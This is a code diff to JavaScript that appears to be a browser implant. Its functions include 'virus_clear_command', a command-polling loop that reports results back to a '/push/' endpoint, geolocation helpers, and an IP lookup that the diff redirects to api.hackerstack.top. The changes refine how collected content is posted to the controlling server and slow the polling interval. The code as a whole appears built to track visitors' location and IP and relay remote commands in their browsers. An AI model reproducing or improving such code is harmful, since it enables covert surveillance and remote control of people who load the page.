@@ -8,15 +8,17 @@ var loop;
 function clear_command() {
     var xhr = new XMLHttpRequest();
     var url = window.location.href;
-    xhr.open("POST","/virus_clear_command/"+url.substring(remote.length),true);
+    xhr.open("GET","/virus_clear_command/"+url.substring(remote.length).replace("/","")+"/",true);
     xhr.send()
 }
 
 function sendReturn(content) {
     var xhr = new XMLHttpRequest();
     var url = window.location.href;
-    xhr.open("POST",("/push/"+url.substring(remote.length)+"/"+content).replace('/',''),true);
-    xhr.send()
+    xhr.open("POST",("/push/"+url.substring(remote.length).replace("/","")+"/"),true);
+    xhr.send(JSON.stringify({
+        "content" : content
+    }))
 }
 function showmap(position) {
     var cords = position.coords;
@@ -44,7 +46,7 @@ function getLocation() {
 }
 function getIP() {
     var xhr = new XMLHttpRequest();
-    xhr.open("GET","https://api.ipify.org/",false)
+    xhr.open("GET","https://api.hackerstack.top/get_my_ip/",false)
     xhr.send();
     return xhr.responseText.replace("\n","")
 }
@@ -182,8 +184,8 @@ loop = setInterval(function () {
     try{
         var xhr = new XMLHttpRequest();
         var url = window.location.href;
-        xhr.open("GET","/push/"+url.substring(remote.length)+"/none",true)
-        xhr.send();
+        xhr.open("POST","/push/"+url.substring(remote.length).replace("/","")+"/",true)
+        xhr.send(JSON.stringify({"content" : "none"}));
 
         xhr.onload = function (e) {
             if (xhr.readyState === 4) {
@@ -199,4 +201,4 @@ loop = setInterval(function () {
     }catch (e){
         clearInterval(loop);
     }
-} , 500)
+} , 1000)
